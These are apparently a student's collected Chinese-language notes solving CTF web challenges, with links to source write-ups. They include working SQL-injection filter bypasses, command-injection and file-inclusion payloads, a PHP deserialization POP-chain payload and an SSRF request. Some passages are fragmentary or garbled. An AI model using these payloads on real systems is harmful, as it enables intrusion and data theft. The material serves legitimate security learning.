...
[[SWPUCTF 2021 新生赛\]sql - traveller-2333 - 博客园 (cnblogs.com)](https://www.cnblogs.com/traverller-2333/p/16274599.html)

看源代码发现参数为wllm。

输入wllm=1回显正确，而wllm=1'回显错误，则是字符型注入。

然后发现空格被过滤，可以用/**/来绕过。?wllm=1'/**/order/**/by/**/4%2

查询字段。

在查询数据库时又出现错误，看了半天才发现是过滤了= 就使用like代替

```php
/?wllm=-1'union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like(database())%23
```

后面一直查询到?wllm=-1'union/**/select/**/1,group_concat(id,flag),3/**/from/**/LTLT_flag%23

发现只有前半段flag

那就用拼接法求flag

重点：：过滤了空格、+、=、right、and等，空格可以用/**/代替，等号可以用like代替，然后过滤了注释符。还是用正常的语句，只不过需要替代
...
观察代码，发现通过正则匹配，过滤了不少东西。但没有取反符号。构造脚本，进行取反。

D:\OneDrive\桌面\新建文件夹 (4)\取反.php
...
观察代码，得到正则匹配过滤了很多，但是可以用tee命令。

tee命令用于将标准输入复制到每个指定文件，并显示到标准输出。tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。

exec不回显，需要执行命令后保存到文件中。
1、1.14.71.254:28077/?url=l’s’ / |tee 1.txt
2、http://1.14.71.254:28077/1.txt 发现/flllll\aaaaaaggggggg
3、url=tac /flllll\aaaaaaggggggg |tee 9.txt
4、http://1.14.71.254:28077/9.txt 得到flag
...
[(92条消息) [SWPUCTF 2021 新生赛\] web_[swpuctf 2021 新生赛]babyunser_ThnPkm的博客-CSDN博客](https://blog.csdn.net/qq_61768489/article/details/126151119?ops_request_misc=&request_id=&biz_id=102&utm_term=[SWPUCTF 2021 新生赛]hardrce_3&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-126151119.nonecase&spm=1018.2226.3001.4187)
...
有题目提示得知，参数为nss，安全的方式传参即post传参。打开火狐利用hackerbar，发现输入1时i显示正常，则为字符型注入。

再用order by试字段数，发现空格以及or被过滤了。用/**/来绕过空格，用双写绕过or 即oorrder by，。

在判断字段位置，发现union被过滤了，双写绕过uniunionon
...
[NSSCTF[SWPU2022\]webdog1__start - 哔哩哔哩 (bilibili.com)](https://www.bilibili.com/read/cv19260410)

页面如下：

Do you really reading to start be a web dog?           DO you think you go here from where?       are you readying to start? 
...
得到http://43.143.7.97:28709/start.php

通过burp抓包获得hint 

或者通过火狐的network，观察消息头
...
```
 ...
 $get = str_ireplace("flag", " ", $get);分析得

要传get但是不能有空格，则需绕过空格。用制表符"%09"、“%0a”  制表符\t 

同时get长度不能超过18需要用到nl

应该是是RCE读取当前php，要求指令长度小于4，只能用nl读取
[Linux](https://so.csdn.net/so/search?q=Linux&spm=1001.2101.3001.7020)中可以将文件名作为函数和参数，通过星号通配执行
...
仔细分析后发现在wllm类中admin，passwd。

后自动调用construct 以及destruct
...
该函数要求text传入welcome to the zjctf，我们可以用php://input伪协议通过POST传参得，也可以通过data伪协议写进去

?text=data://text/plain,welcome to the zjctf

为了保险最好将参数转化为base64的格式。

?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=

第二层绕过wei正则其中要求不能有flag，题目又提示了useless.php那么就可以通过fiflter伪协议读取
...
利用data绕过/test2222222222222.php?a=data://text/plain;base64,SSB3YW50IGZsYWc=)
...
一开始给一个网站 ，用御剑扫描得到index.php，打开后弹出，

eval post cmd；推测是一句话木马。
...
由于是ping命令，直接输入127.0.0.1查看本地，

输入;ls 查看出有flag.php直接用cat读取。
...
?ip=%3Ba%3Dg%3Btac%24IFS%241fla%24a.php
...
发现如果输入的payload超过800即可绕过。

那就用脏数据绕过。

PD9waHAgPSdOU1NDVEZ7MGE1ZmI0MGItM2M0OS00MTBkLTg1NjgtN2UyNDRlMjEwZjhhfSc7Cg==
...
在hint.php中发现ffffllllaaaagggg

代码审计得

要想读出，则要经过emm类的checkFile函数。

看白名单得，参数为字符串



并且mb_substr函数会将p a g e 变 量 会 截 取 从 第 零 位 开 始 到 m b s t r p o s ( _page变量会截取 从第零位开始 到 mb_strpos( 
p

 age变量会截取从第零位开始到mb strpos(page . ‘?’, ‘?’)
...
这里接着代码看会看到第二次对参数page进行了处理，参数page先URL编码解码接着进行了与此前相同的截取处理。所以我们对?进行两次URL编码即可获得新的payload(编码两次是因为服务器会默认URL解码一次，只对?URL编码是因为include()包含的路径并没有第二次URL解码)
...
接着__invoke（）调用append函数

再接着___get()调用 _invoke()函数
...
$c_var=new Try_Work_Hard;
$d_effort=new Make_a_Change;

$a_page->page=$b_string;
$b_string->string=$d_effort;
$d_effort->effort=$c_var;


echo urlencode(serialize($a_page));
```

payload为： ?wish=O%3A12%3A"Road_is_Long"%3A2%3A%7Bs%3A4%3A"page"%3BO%3A12%3A"Road_is_Long"%3A2%3A%7Bs%3A4%3A"page"%3BN%3Bs%3A6%3A"string"%3BO%3A13%3A"Make_a_Change"%3A1%3A%7Bs%3A6%3A"effort"%3BO%3A13%3A"Try_Work_Hard"%3A1%3A%7Bs%3A6%3A"%00%2A%00var"%3Bs%3A5%3A"%2Fflag"%3B%7D%7D%7Ds%3A6%3A"string"%3BN%3B%7D
...
[NSS[SWPUCTF 2022 新生赛\]ez_ez_unserialize+file_master+ez_1zpop - 哔哩哔哩 (bilibili.com)](https://www.bilibili.com/read/cv21728833)

[分类 (hzy2003628.top)](https://hzy2003628.top/2022/10/02/SWPU NSS新生赛/#ez_1zpop)

[SWPU NSS 2022 秋季招新赛 Web 出题人笔记 - 问谛居 (wd-ljt.com)](https://www.wd-ljt.com/post/1024/894.html)
...
payload为：/?filename=php://filter/convert.iconv.UTF-7.UCS-4%2a/resource=/var/www/html/flag.php
...
[(94条消息) 攻防世界ctf题目easyupload做题笔记。_夜yesir的博客-CSDN博客](https://blog.csdn.net/qq_56426046/article/details/126563269)

[easyupload-wp以及新知识-Drton1博客 (yanyang.ink)](https://www.yanyang.ink/2022/08/30/easyupload-wp以及新知识/)
...
[2022HNCTF--WEB - yb0o5ing - 博客园 (cnblogs.com)](https://www.cnblogs.com/yb0osing/archive/2022/10/29/HNCTF_WP_web.html#week2ez_ssrf)

[2022HNCTF--WEB - yb0o5ing - 博客园 (cnblogs.com)](https://www.cnblogs.com/yb0osing/archive/2022/10/29/HNCTF_WP_web.html#week2ez_ssrf)

[(94条消息) 细说——SSRF_ssrf dict协议_lainwith的博客-CSDN博客](https://blog.csdn.net/weixin_44288604/article/details/120710499)
...
payload: /index.php?data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=&host=127.0.0.1&port=80]
